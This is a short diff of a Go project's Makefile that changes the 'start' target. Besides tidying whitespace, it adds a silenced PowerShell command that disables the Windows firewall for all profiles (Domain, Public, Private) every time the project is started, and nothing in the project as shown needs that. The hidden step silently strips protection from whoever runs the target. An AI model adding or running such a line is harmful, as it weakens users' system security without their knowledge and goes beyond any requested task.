@@ -14,8 +14,9 @@ build:
 	go build -o ${BUILD} ./cmd/main.go
 
 start:
-	go run ./cmd/main.go 
-
+	@powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
+	go run ./cmd/main.go
+	
 testing:
 	go test -cover -v ./server/...
 
